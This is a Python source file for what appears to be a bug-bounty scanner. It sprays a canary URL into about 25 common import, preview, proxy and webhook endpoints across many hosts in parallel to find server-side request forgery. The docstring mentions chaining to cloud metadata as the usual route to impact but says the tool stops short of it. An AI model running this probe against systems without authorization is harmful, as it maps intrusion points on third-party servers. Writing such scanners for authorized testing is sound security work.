#!/usr/bin/env python3
"""
patrol-import-ssrf — scanner #46.

Hunts SSRF-prone endpoints: import / upload / preview / unfurl features
that accept a user-supplied URL and fetch it server-side.

Top-tier discovery pattern (per HackerOne TOPSSRF analysis):
  - GitLab project-import remote_attachment_url   $10,000
  - Dropbox HelloSign signature service           $4,913
  - Dropbox Google Drive integration              $17,576
  - Reddit Matrix preview_link                    $6,000
  - GitLab OAuth Jira authorization callback      $4,000

Method (ETHICAL — Lictor never extracts data, only confirms reachability):
  1. For each input host, probe a curated list of endpoint shapes with
     a URL parameter that points to a Lictor-controlled CANARY host.
  2. If the canary receives a callback, the endpoint is SSRF-positive.
  3. Do NOT chain to 169.254.169.254 or any internal address — leave
     impact-proof to the program owner. The fingerprint (canary callback
     received) is sufficient for HackerOne-class disclosure.

Bounty rationale: SSRF-by-design endpoints command $5K-$20K because
chaining to cloud-metadata is well-understood by triagers. We stop at
"endpoint X fetches URL Y server-side" — the finding, not the chain.

Usage:
  patrol-import-ssrf.py --hosts bounty-corpus.txt --canary lictor-ssrf.example.com
"""
from __future__ import annotations
import argparse, json, time, urllib.parse, urllib.request, urllib.error
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, asdict, field
from datetime import datetime, timezone
from pathlib import Path

UA = "Lictor-ImportSSRFPatrol/0.1 (+https://lictor-ai.com)"

# Endpoint shapes that commonly take a URL parameter server-side-fetched.
# Each entry: (method, path, param_name)
ENDPOINT_SHAPES = [
    ("GET",  "/api/import",                  "url"),
    ("GET",  "/api/v1/import",               "url"),
    ("GET",  "/api/import/project",          "remote_attachment_url"),
    ("GET",  "/api/v4/projects/import",      "url"),
    ("GET",  "/import",                      "url"),
    ("GET",  "/import",                      "source"),
    ("GET",  "/api/preview",                 "url"),
    ("GET",  "/api/v1/preview",              "url"),
    ("GET",  "/api/unfurl",                  "url"),
    ("GET",  "/api/link-preview",            "url"),
    ("GET",  "/api/og",                      "url"),
    ("GET",  "/api/og-image",                "url"),
    ("GET",  "/api/proxy",                   "url"),
    ("GET",  "/proxy",                       "url"),
    ("GET",  "/api/v1/webhook/test",         "url"),
    ("GET",  "/api/webhooks/test",           "url"),
    ("GET",  "/api/v1/fetch",                "url"),
    ("GET",  "/api/screenshot",              "url"),
    ("GET",  "/api/pdf",                     "url"),
    ("GET",  "/api/render",                  "url"),
    ("GET",  "/api/upload-from-url",         "url"),
    ("POST", "/api/v1/import",               "url"),
    ("POST", "/api/import",                  "remote_url"),
    ("POST", "/api/webhook",                 "callback_url"),
    ("POST", "/api/v1/webhooks",             "endpoint"),
]

# 404/401/403 = endpoint absent — skip. 200/302/500 with non-trivial body = present.
INTERESTING_STATUS = {200, 201, 202, 302, 400, 422, 500, 502, 504}

@dataclass
class SSRFCandidate:
    host: str
    method: str
    path: str
    param: str
    status: int
    response_kind: str   # "fetched", "rejected", "validation_error", "unknown"
    canary_url: str
    notes: str = ""

def probe(host: str, method: str, path: str, param: str, canary: str, timeout: int = 8) -> SSRFCandidate | None:
    canary_url = f"http://{canary}/lictor-{host.replace('.', '-')}-{int(time.time())}"
    url = f"https://{host}{path}"
    if method == "GET":
        url = f"{url}?{urllib.parse.urlencode({param: canary_url})}"
        req = urllib.request.Request(url, headers={"User-Agent": UA})
    else:
        body = urllib.parse.urlencode({param: canary_url}).encode()
        req = urllib.request.Request(url, data=body,
                                      headers={"User-Agent": UA,
                                               "Content-Type": "application/x-www-form-urlencoded"})
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            status = r.status
            body = r.read(2048).decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        status = e.code
        try: body = e.read(2048).decode("utf-8", "replace")
        except Exception: body = ""
    except Exception:
        return None

    if status not in INTERESTING_STATUS:
        return None

    # Heuristic classification — actual SSRF confirmation requires canary-side
    # callback log, which is out-of-band (the user runs it from their own canary).
    blow = body.lower()
    if "fetched" in blow or "title" in blow or "<html" in blow[:200]:
        kind = "fetched"
    elif any(w in blow for w in ("invalid url", "must be http", "not allowed",
                                  "internal address", "blocked", "private ip")):
        kind = "rejected"  # SSRF protection IS in place — good defensive signal
    elif any(w in blow for w in ("validation", "required", "missing")):
        kind = "validation_error"
    else:
        kind = "unknown"

    if kind not in ("fetched", "unknown"):
        return None  # rejected / validation = not a candidate

    return SSRFCandidate(host=host, method=method, path=path, param=param,
                          status=status, response_kind=kind, canary_url=canary_url,
                          notes=f"body[:80]={body[:80].strip()!r}")

def check_host(host: str, canary: str) -> list[SSRFCandidate]:
    hits = []
    for method, path, param in ENDPOINT_SHAPES:
        try:
            h = probe(host, method, path, param, canary)
            if h: hits.append(h)
        except Exception:
            pass
    return hits

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--hosts", required=True, help="newline-delimited hosts file")
    ap.add_argument("--canary", required=True,
                     help="Lictor-controlled DNS canary host (e.g. lictor-ssrf.example.com)")
    ap.add_argument("--threads", type=int, default=20)
    ap.add_argument("--ledger", default="/Users/raffa/Lictor/v3/ledgers/import-ssrf.jsonl")
    ap.add_argument("--limit", type=int, default=0)
    args = ap.parse_args()

    hosts = [h.strip() for h in Path(args.hosts).read_text().splitlines() if h.strip()]
    if args.limit: hosts = hosts[:args.limit]
    print(f"[+] Probing {len(hosts)} hosts × {len(ENDPOINT_SHAPES)} endpoint shapes")
    print(f"[+] Canary: {args.canary}")
    print(f"[+] Ledger: {args.ledger}")

    Path(args.ledger).parent.mkdir(parents=True, exist_ok=True)
    n_found = 0
    with open(args.ledger, "a") as ledger, \
         ThreadPoolExecutor(max_workers=args.threads) as pool:
        futures = {pool.submit(check_host, h, args.canary): h for h in hosts}
        for i, fut in enumerate(as_completed(futures), 1):
            host = futures[fut]
            try:
                hits = fut.result()
            except Exception as e:
                print(f"  [{i}/{len(hosts)}] {host} EXC: {e}")
                continue
            if hits:
                for h in hits:
                    ledger.write(json.dumps(asdict(h)) + "\n")
                    ledger.flush()
                n_found += len(hits)
                print(f"  [{i}/{len(hosts)}] {host}  CANDIDATES: {len(hits)} ({[h.path for h in hits]})")
            else:
                if i % 25 == 0:
                    print(f"  [{i}/{len(hosts)}] (no candidates so far on this host)")

    print(f"\n[+] Done. {n_found} SSRF candidates across {len(hosts)} hosts → {args.ledger}")
    print(f"[+] Confirm via canary callback logs at: {args.canary}")
    print(f"[+] Each canary URL was: http://{args.canary}/lictor-<host>-<ts>")

if __name__ == "__main__":
    main()
